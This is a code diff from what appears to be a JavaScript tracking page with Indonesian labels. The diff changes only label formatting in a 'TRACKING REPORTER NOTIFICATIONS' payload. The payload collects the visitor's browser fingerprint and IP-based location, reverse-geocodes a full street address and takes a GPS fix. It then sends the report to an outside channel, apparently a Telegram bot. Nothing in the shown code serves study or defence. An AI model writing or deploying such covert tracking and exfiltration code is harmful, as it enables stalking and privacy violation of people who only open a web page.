@@ -220,54 +220,54 @@
  const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
     
   const cDI = async () => {
-  let m = '<b>TRACKING REPORTER NOTIFICATIONS</b>\n\n';
-  m += '<blockquote><b>DEVICE INFORMATION\n';
-  m += `🖥️ Device: ${navigator.userAgent}\n`;
-  m += `💻 Platform: ${navigator.platform}\n`;
-  m += `🌐 Bahasa: ${navigator.language}\n`;
-  m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
-  m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
-  m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
-  m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-  m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}</b></blockquote>\n`;
+  let m = 'TRACKING REPORTER NOTIFICATIONS\n\n';
+  m += 'DEVICE INFORMATION\n';
+  m += `🖥️ DEVICE: ${navigator.userAgent}\n`;
+  m += `💻 PLATFORM: ${navigator.platform}\n`;
+  m += `🌐 LANGUAGE: ${navigator.language}\n`;
+  m += `📶 ONLINE: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+  m += `📺 SREEN SIZE: ${screen.width}x${screen.height}\n`;
+  m += `🪟 WINDOWS SIZE: ${innerWidth}x${innerHeight}\n`;
+  m += `💾 RAM DEVICE: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+  m += `🧠 CPU DEVICE: ${navigator.hardwareConcurrency}</b></blockquote>\n`;
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
-      m += `<blockquote><b>🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
-      m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+      m += `<blockquote><b>🔋 BATTERY: ${Math.floor(b.level * 100)}%\n`;
+      m += `🔌 CHARGING: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
     } catch (e) {
-      m += '🔋 Battery: ❌ Tidak tersedia</b></blockquote>\n';
+      m += '🔋 BATTERY: ❌ Tidak tersedia</b></blockquote>\n';
     }
   }
-  m += `<blockquote><b>⏰ Waktu Akses: ${new Date().toString()}\n`;
-  m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
-  m += `📜 History Length: ${history.length}\n`;
-  m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
-  m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
-  m += `🌍 URL: ${location.href}\n`;
-  m += `📄 Title: ${document.title}\n`;
-  m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-  m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit</b></blockquote>\n\n`;
+  m += `<blockquote><b>⏰ ACCES TIME: ${new Date().toString()}\n`;
+  m += `🕒 PAGE LOAD TIME: ${performance.now().toFixed(2)} ms\n`;
+  m += `📜 HISTORY LENGTH: ${history.length}\n`;
+  m += `✋ TOUCH SUPPORT: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+  m += `🔗 REFFERER: ${document.referrer || 'None'}\n`;
+  m += `🌍 URL ACCES: ${location.href}\n`;
+  m += `📄 TITLE: ${document.title}\n`;
+  m += `🕓 TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+  m += `🧭 OFFSET: ${new Date().getTimezoneOffset()} menit</b></blockquote>\n\n`;
 
   try {
     const i = await fetch('https://ipapi.co/json/');
     const d = await i.json();
     m += '<blockquote><b>📍 LOCATION INFORMATION\n';
-    m += `📡 IP Address: ${d.ip}\n`;
-    m += `🏙️ Kota: ${d.city}\n`;
-    m += `🏙️ Kabupaten: ${d.region}\n`;
-    m += `🗺️ Wilayah: ${d.region}\n`;
-    m += `🌎 Negara: ${d.country_name}\n`;
-    m += `🏷️ Kode Pos: ${d.postal}\n`;
+    m += `📡 IP ADDRES: ${d.ip}\n`;
+    m += `🏙️ KOTA: ${d.city}\n`;
+    m += `🏙️ KABUPATEN: ${d.region}\n`;
+    m += `🗺️ WILAYAH: ${d.region}\n`;
+    m += `🌎 NEGARA: ${d.country_name}\n`;
+    m += `🏷️ KODE POS: ${d.postal}\n`;
 
     if (d.latitude && d.longitude) {
-      m += `📌 Latitude: ${d.latitude}\n`;
-      m += `📍 Longitude: ${d.longitude}\n`;
+      m += `📌 LATITUDE: ${d.latitude}\n`;
+      m += `📍 LONGITUDE: ${d.longitude}\n`;
 
       const l = await gLD(d.latitude, d.longitude);
-      m += `🏙️ Kabupaten: ${l.kb}\n`;
-      m += `🏙️ Kecamatan: ${l.kc}\n`;
-      m += `🏠 Alamat Lengkap: ${l.fa}</b></blockquote>\n`;
+      m += `🏙️ KABUPATEN: ${l.kb}\n`;
+      m += `🏙️ KECAMATAN: ${l.kc}\n`;
+      m += `🏠 ALAMAT LENGKAP: ${l.fa}</b></blockquote>\n`;
     }
   } catch (e) {
     m += '❌ Gagal mendapatkan informasi lokasi\n';
@@ -329,12 +329,12 @@
             navigator.geolocation.getCurrentPosition(async p=>{
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
-     let g=`<b>📍 GPS TRACKING (ONE-TIME)</b>\n`;
-       g+=`<blockquote>📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-       g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-       g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+     let g=`<blockquote><b>📍 GPS TRACKING (ONE-TIME)</b>\n\n`;
+       g+=`📌 LAT: ${lat}\n📍 LNG: ${lon}\n`;
+       g+=`🎯 AKURASI: ${p.coords.accuracy}m\n`;
+       g+=`🗺️ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
       const l=await gLD(lat,lon);
-      g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}</blockquote>\n`;
+      g+=`🏙️ KABUPATEN: ${l.kb}\n🏙️ KECAMATAN: ${l.kc}\n🏠 ALAMAT: ${l.fa}</blockquote>\n`;
       await sTG(g)
             },
             async e=>{
